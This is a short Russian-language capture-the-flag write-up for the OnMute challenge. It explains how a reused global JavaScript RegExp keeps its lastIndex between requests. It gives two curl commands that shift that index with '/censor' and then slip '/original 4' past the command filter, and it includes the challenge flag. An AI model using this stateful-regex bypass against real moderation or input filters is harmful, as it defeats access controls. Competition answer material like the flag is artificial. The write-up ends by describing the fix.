# OnMute

**Флаг:** `avito{REg3X_FOr_51lENCE_5laSh_G_FOr_V10LENc3}`

OnMute переиспользует один JavaScript `RegExp` с флагом `g` в пределах сессии.
Такое выражение хранит позицию `lastIndex`. Команда `/censor` сдвигает её, и следующий
запрос `/original 4` проходит проверку с середины строки, пропуская запрещённую команду.

## Два запроса

В первом треке слово `массаж` находится на позициях `[617:623]`. Его обработка
устанавливает ненулевой `lastIndex`. Сразу после этого в той же сессии запрашивается
оригинальный текст четвёртого трека:

```bash
curl -s -c jar https://onmute-xtegmx4v.avitoctf.ru/api/tracks/1/comment \
  -H 'Content-Type: application/json' -d '{"text":"/censor 617 623"}'
curl -s -b jar https://onmute-xtegmx4v.avitoctf.ru/api/tracks/4/comment \
  -H 'Content-Type: application/json' -d '{"text":"/original 4"}'
```

Проверка начинается с сохранённого смещения и не видит `/original` в начале строки.
Ответ содержит нецензурированный текст и флаг. Промежуточный запрос к модерации может
сбросить состояние, поэтому порядок и общий cookie важны.

## Запуск

[solve_onmute.py](solve_onmute.py) получает текст через API и находит смещения слова
динамически, затем выполняет оба запроса:

```bash
uv run python onmute/solve_onmute.py
```

Нужен работающий экземпляр; адрес задаётся в скрипте. Исходный архив
`onmute_a003aa0.zip` не включён в Git.

Для проверки наличия запрещённого слова флаг `g` не нужен. Если выражение всё же
используется повторно, его состояние нельзя переносить между независимыми проверками.
